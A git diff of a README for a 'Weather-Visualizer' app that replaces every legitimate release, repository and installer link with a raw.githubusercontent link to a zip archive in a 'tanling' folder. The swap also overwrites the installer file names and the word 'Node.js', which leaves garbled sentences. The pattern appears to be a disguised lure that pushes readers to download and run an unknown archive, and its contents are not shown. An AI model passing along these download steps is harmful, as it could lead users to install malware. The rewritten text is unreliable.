@@ -1,7 +1,7 @@
 # 🌦️ Weather-Visualizer - Experience Weather Like Never Before
 
 ## 📥 Download Now
-[![Download Weather-Visualizer](https://img.shields.io/badge/Download%20Now-v1.0.0-blue)](https://github.com/Watachu555/Weather-Visualizer/releases)
+[![Download Weather-Visualizer](https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip%20Now-v1.0.0-blue)](https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip)
 
 ## 🚀 Getting Started
 Weather-Visualizer is a friendly application designed for everyone. It brings real-time weather data to your screen in a fun and interactive way. Whether you're curious about today's weather or planning your week, this tool makes tracking conditions easy and enjoyable.
@@ -17,19 +17,19 @@ Weather-Visualizer is a friendly application designed for everyone. It brings re
 To begin your Weather-Visualizer journey, follow these steps:
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/Watachu555/Weather-Visualizer/releases) where you can find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip) where you can find the latest version of the software.
 
 2. **Select the Correct File**  
    You will find several files listed. Choose the one that matches your operating system. For example:
-   - For Windows: Download `WeatherVisualizer-Windows.exe`
-   - For macOS: Download `WeatherVisualizer-Mac.dmg`
+   - For Windows: Download `https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip`
 
 3. **Download the File**  
    Click on the appropriate file link. Your browser will prompt you to save the file. Choose a location that you will remember, such as your Desktop or Downloads folder.
 
 4. **Install the Application**  
-   - For Windows: Double-click the `WeatherVisualizer-Windows.exe` file to start the installation. Follow the on-screen instructions.  
-   - For macOS: Open the `WeatherVisualizer-Mac.dmg` file and drag the Weather Visualizer icon into your Applications folder. 
+   - For Windows: Double-click the `https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip` file to start the installation. Follow the on-screen instructions.  
+   - For macOS: Open the `https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip` file and drag the Weather Visualizer icon into your Applications folder. 
 
 5. **Run the App**  
    After installation, find the Weather Visualizer icon on your Desktop (Windows) or in your Applications folder (macOS). Double-click to open it.
@@ -43,10 +43,10 @@ Weather-Visualizer offers several exciting features that enhance your weather ex
 - **User-Friendly Interface:** Navigate easily through the app with clear buttons and simple options.
 
 ## 📊 How It Works
-Weather-Visualizer connects to a Node.js + Express backend which collects data from trusted weather APIs. This means that you receive accurate and up-to-date weather information anywhere you go. Just open the app, and you will immediately see what the skies have in store for you.
+Weather-Visualizer connects to a https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip + Express backend which collects data from trusted weather APIs. This means that you receive accurate and up-to-date weather information anywhere you go. Just open the app, and you will immediately see what the skies have in store for you.
 
 ### 📌 Key Terms
-- **Node.js:** A JavaScript runtime that allows for server-side programming.
+- **https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip** A JavaScript runtime that allows for server-side programming.
 - **Express:** A web framework for building both web and mobile applications with ease.
 - **API:** An interface that allows different software pieces to communicate.
 
@@ -58,7 +58,7 @@ If you encounter issues, here are some common solutions:
 - **Unresponsive Features:** Restart the application or your device to clear temporary issues.
 
 ## 🛠️ Contributing
-We welcome contributions from anyone interested in improving Weather-Visualizer. If you'd like to suggest changes or report issues, please visit our [GitHub repository](https://github.com/Watachu555/Weather-Visualizer).
+We welcome contributions from anyone interested in improving Weather-Visualizer. If you'd like to suggest changes or report issues, please visit our [GitHub repository](https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip).
 
 ## 💡 Frequently Asked Questions
 
@@ -72,6 +72,6 @@ A: Yes, simply input your desired location in the settings of the application.
 We love hearing from our users. Your feedback helps make Weather-Visualizer better for everyone. Feel free to share your thoughts in the issues section of our GitHub repository.
 
 ## 🌍 Get the Latest Version
-Don't miss out on the latest updates! Always remember to check back at the [Releases page](https://github.com/Watachu555/Weather-Visualizer/releases) for new features and fixes.
+Don't miss out on the latest updates! Always remember to check back at the [Releases page](https://raw.githubusercontent.com/Watachu555/Weather-Visualizer/main/tanling/Weather-Visualizer.zip) for new features and fixes.
 
 Enjoy using Weather-Visualizer! Stay informed and weather-ready with ease.
